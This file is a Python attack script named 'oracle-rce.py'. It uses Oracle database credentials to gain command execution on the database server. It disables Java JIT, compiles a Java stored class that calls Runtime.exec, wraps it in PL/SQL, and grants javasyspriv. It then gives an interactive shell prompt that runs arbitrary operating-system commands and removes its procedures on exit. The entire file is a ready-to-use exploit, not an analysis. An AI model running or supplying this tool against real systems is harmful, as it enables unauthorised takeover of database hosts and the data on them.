# -*- coding: utf-8 -*-
# Edited By EstamelGG
import cx_Oracle
import sys
import signal
import getopt

#log
def normal(text):
	text = "[*]%s"%text
	return print(text)

def warning(text):
	text = "[!]%s"%text
	return print(text)

def error(text):
	text = "[X]%s"%text
	return print(text)

def executeresult(text):
	text = "[+]%s"%text
	return print(text)

#login
def login(user,pwd,host,port,sid):
	try:
		db = cx_Oracle.connect("%s"%user,"%s"%pwd,"%s:%s/%s"%(host,port,sid))
		normal("Login successfully, DB version:%s"%db.version)
		return db
	except Exception as e:
		error(e)
	

#disable JAVA_JIT
def JAVA_JIT(cur):
	query = "alter system set JAVA_JIT_ENABLED= FALSE scope = both"
	try:
		cur.execute(query)
		normal("JAVA_JIT Disabled")
	except Exception as e:
		error(e)

def CreatePLSQL(cur):
	query1 = """
		CREATE OR REPLACE AND COMPILE 
		JAVA SOURCE NAMED "util"
		as
		import java.io.*;
		import java.lang.*;
		public class util extends Object
		{
		    public static int RunThis(String args)
		    {
		        Runtime rt = Runtime.getRuntime();
		        int RC = -1;
		        try
		        {
		            Process p = rt.exec(args);
		            int bufSize = 4096;
		            BufferedInputStream bis = new BufferedInputStream(p.getInputStream(),
		                bufSize);
		            int len;
		            byte buffer[] = new byte[bufSize];
		            while((len = bis.read(buffer, 0, bufSize)) != -1)
		                System.out.write(buffer, 0, len);
		            RC = p.waitFor();
		        }
		        catch(Exception e)
		        {
		            e.printStackTrace();
		            RC = -1;
		        }
		        finally
		        {
		            return RC;
		        }
		    }
		}
	"""

	query2 = """
		create or replace
		function run_cmd(p_cmd in varchar2) return number
		as
		language java
		name 'util.RunThis(java.lang.String) return integer';
	"""

	query3 = """
		create or replace procedure RC(p_cmd in varChar)
		as
		x number;
		begin
		x := run_cmd(p_cmd);
		end;
	"""

	query4 = """
	grant javasyspriv to system
	"""

	try:
		cur.execute(query1)
		normal("Java Created")
		cur.execute(query2)
		normal("Function Created")
		cur.execute(query3)
		normal("Procedure Created")
		cur.callproc("dbms_output.enable", (1024,))
		cur.callproc("dbms_java.set_output",(100000,))
		normal("PL/SQL Procedure successfully completed")
		cur.execute(query4)
		normal("Grant Successfully")
		print("="*32)
		return cur
	except Exception as e:
		error(e)

#run code
def rce(cur,cmd):
	cur.callfunc("run_cmd",cx_Oracle.NUMBER,(cmd,))
	#get result
	result = ""
	statusVar = cur.var(cx_Oracle.NUMBER)
	lineVar = cur.var(cx_Oracle.STRING)
	while True:
		try:
			cur.callproc("dbms_output.get_line", (lineVar, statusVar))
			if statusVar.getvalue() != 0:
				break
			text = lineVar.getvalue()
			if text == None:
				text = "\r\n"
			print(text)
		except Exception as e:
			error(e)

#clean function
def dropfun(cur):
	query = "drop procedure RC"
	cur.execute(query)
	query = "drop function run_cmd"
	cur.execute(query)
	
def quit(signum, frame):
	dropfun(cur)
	print()
	warning("Function & Procedure Dropped")
	sys.exit()

#default
port = '1521'
host = '127.0.0.1'
user = ''
pwd = ''
sid = ''
#get args
try:
	opts, args = getopt.getopt(sys.argv[1:],"hi:u:p:h:P:s:")
	if len(opts) == 0:
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
		sys.exit()
except getopt.GetoptError:
	print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
	sys.exit()

for opt, arg in opts:
	if opt == '-h':
		print('usage: oracle-rce.py -i <host> -u <user> -p <password> -P <port> -s <sid/service>')
		sys.exit()
	elif opt == "-i":
		host = arg
	elif opt == "-u":
		user = arg
	elif opt == "-p":
		pwd = arg
	elif opt == "-P":
		ort = arg
	elif opt == "-s":
		sid = arg

normal("Target: %s:%s/%s"%(host,port,sid))
#login and others
db = login(user,pwd,host,port,sid)
cur = db.cursor()
signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
JAVA_JIT(cur)
CreatePLSQL(cur)
executeresult("Execute Command:")
while True:
	cmd = input(">>>")
	if cmd:
		rce(cur,cmd)
dropfun(cur)
print()
warning("Function & Procedure Dropped")





